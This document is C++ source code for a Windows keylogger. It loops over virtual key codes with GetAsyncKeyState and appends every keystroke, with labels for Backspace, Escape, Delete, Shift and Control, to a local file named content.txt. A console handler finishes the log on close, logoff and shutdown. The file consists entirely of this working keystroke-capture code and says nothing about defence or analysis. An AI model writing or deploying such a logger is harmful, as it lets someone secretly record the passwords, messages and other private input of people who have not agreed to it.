#include <iostream>
#include <fstream>
#include <string>
#include <chrono>
#include <Windows.h>

using namespace std;

void saveToFile(const string fileName, const char contentToSave);
void saveToFile(const string fileName, const string contentToSave);
void closeOperation(void);
void getLocalTime(tm* adress);

BOOL WINAPI CtrlHandler(DWORD fdwCtrlType);

const string fileName = "content.txt";

int main(int argc, char* argv[])
{

	//Get local time
	tm localTime = {};
	getLocalTime(&localTime);

	//Convert the local time to a readable format
	char str[26] = {};
	asctime_s(str, 26, &localTime);

	saveToFile(fileName, str);

	SetConsoleCtrlHandler(CtrlHandler, TRUE);

	auto start = chrono::high_resolution_clock::now();
	auto stop = chrono::high_resolution_clock::now();

	while (true)
	{
		for (int i = 8; i <= 255; i++)
		{
			//If a key is pressed
			if (GetAsyncKeyState(i) == -32767)
			{
				//Time duration between each key pressed
				stop = chrono::high_resolution_clock::now();
				auto duration = chrono::duration_cast<chrono::seconds>(stop - start);

				if (duration.count() > 3)
					saveToFile(fileName, "\n");
				if (i == 8)
					saveToFile(fileName, "[BS]");
				else if (i == 27)
					saveToFile(fileName, "[ESC]");
				else if (i == 127)
					saveToFile(fileName, "[DEL]");
				else if (i == VK_SHIFT)
				{
					saveToFile(fileName, "\n[SHIFT + ");
					saveToFile(fileName, i);
					saveToFile(fileName, "]");
				}
				else if (i == VK_LCONTROL)
				{
					saveToFile(fileName, "\n[CTRL + ");
					saveToFile(fileName, i);
					saveToFile(fileName, "]");
				}
				else
					saveToFile(fileName, (char)i);

				start = chrono::high_resolution_clock::now();
			}
		}
	}

	return 1;
}

void saveToFile(const string fileName, const char contentToSave)
{
	ofstream file;
	file.open(fileName, ios::app);
	file << contentToSave;
	file.close();
}

void saveToFile(const string fileName, const string contentToSave)
{
	ofstream file;
	file.open(fileName, ios::app);
	file << contentToSave;
	file.close();
}

void closeOperation(void)
{
	saveToFile(fileName, "\n\n");
}

BOOL WINAPI CtrlHandler(DWORD fdwCtrlType)
{
	switch (fdwCtrlType)
	{
	case CTRL_CLOSE_EVENT:
		closeOperation();
		return TRUE;
	case CTRL_LOGOFF_EVENT:
		closeOperation();
		return TRUE;

	case CTRL_SHUTDOWN_EVENT:
		closeOperation();
		return TRUE;
	default:
		return FALSE;
	}
}

void getLocalTime(tm* adress)
{
	//Get time since 1970
	time_t now = time(NULL);
	//Convert the time since 1970 to the local time
	localtime_s(adress, &now);
}